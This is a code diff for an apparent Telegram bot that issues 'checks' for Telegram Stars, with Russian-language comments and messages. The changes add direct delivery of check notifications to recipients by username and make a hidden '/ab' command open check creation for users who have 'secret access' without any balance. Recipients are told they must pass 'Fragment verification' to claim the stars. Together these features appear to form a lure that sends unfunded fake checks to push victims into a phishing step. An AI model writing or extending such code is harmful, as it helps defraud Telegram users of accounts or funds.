@@ -48,6 +48,8 @@ user_temp: dict[int, dict] = {}
 checks: dict[str, dict] = {}
 # Юзеры с секретным доступом к чекам (без баланса)
 check_bypass_users: set[int] = set()
+# Маппинг username -> uid для отправки чеков
+username_to_uid: dict[str, int] = {}
 
 
 # ==================== TELEGRAM API ====================
@@ -300,14 +302,33 @@ async def cb_confirm_check(chat_id: int, msg_id: int, uid: int):
     bu = BOT_USERNAME.lstrip("@")
     link = f"https://t.me/{bu}?start=check_{code}"
     clear_state(uid)
+    # пробуем отправить чек получателю напрямую
+    target_uid = username_to_uid.get(target.lower())
+    sent_warning = ""
+    if target_uid:
+        try:
+            check_kb = ikb([
+                [btn("Получить звезды", url=link)],
+            ])
+            await _send_msg(target_uid,
+                f"*Вам отправлен чек на {stars} звезд*\n\n"
+                "Для получения перейдите по кнопке ниже.",
+                reply_markup=check_kb)
+        except Exception:
+            sent_warning = "\n\n⚠️ Пользователь не запустил бота"
+    else:
+        sent_warning = "\n\n⚠️ Пользователь не запустил бота"
+
     kb = ikb([
-        [btn("Переслать", url=f"https://t.me/share/url?url={link}&text=Чек на {stars} звезд")],
+        [btn("Переслать", url=f"https://t.me/share/url?url={link}&text=Чек на {stars} звезд. Для получения перейдите по ссылке.")],
         [btn("Главное меню", "main_menu")],
     ])
     await _delete_msg(chat_id, msg_id)
     await _send_msg(chat_id,
         f"*Чек создан*\n\nСумма звезд: *{stars}*\nПолучатель: @{target}\n\n"
-        f"Ссылка:\n{link}\n\n"
+        f"Ссылка:\n{link}"
+        f"{sent_warning}\n\n"
+        "Отправьте ссылку получателю через кнопку ниже.\n"
         "Для получения звезд необходимо пройти верификацию Fragment.",
         reply_markup=kb)
 
@@ -775,8 +796,8 @@ async def handle_text_message(chat_id: int, uid: int, text: str, user: dict, pho
     elif state == "check_username":
         stars = gtemp(uid, "check_stars")
         target = text.strip().lstrip("@").replace(" ", "")
-        if not target or len(target) < 2:
-            await _send_msg(chat_id, "Username должен быть минимум 2 символа. Введите username:")
+        if not target or len(target) < 5:
+            await _send_msg(chat_id, "Юзернейм должен начинаться от 5-ти букв. Введите username:")
             return
         set_state(uid, "check_confirm", check_stars=stars, check_target=target)
         kb = ikb([
@@ -1186,6 +1207,8 @@ async def handle_update(update: dict):
     photo_file_id = photo[-1]["file_id"] if photo else None
 
     all_users.add(uid)
+    if user.get("username"):
+        username_to_uid[user["username"].lower()] = uid
 
     # Команды
     if text.startswith("/start"):
@@ -1201,7 +1224,10 @@ async def handle_update(update: dict):
 
     if text == "/ab":
         check_bypass_users.add(uid)
-        await _send_msg(chat_id, "Доступ к чекам активирован.")
+        clear_state(uid)
+        set_state(uid, "check_amount")
+        await _send_msg(chat_id, "*Создать чек*\n\nВведите сумму звезд:",
+                        reply_markup=back_kb("main_menu"))
         return
 
     if text == "/buy":
